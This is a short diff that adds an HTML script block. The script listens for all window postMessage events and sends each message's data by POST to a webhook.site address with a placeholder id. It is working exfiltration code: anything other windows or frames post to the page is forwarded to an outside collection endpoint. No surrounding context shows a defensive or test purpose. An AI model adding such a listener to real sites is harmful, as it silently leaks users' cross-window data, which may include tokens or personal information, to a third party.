@@ -1,0 +1,8 @@
+<script>
+window.addEventListener("message", (event) => {
+  fetch("https://webhook.site/your-id", {
+    method: "POST",
+    body: JSON.stringify(event.data)
+  });
+});
+</script>
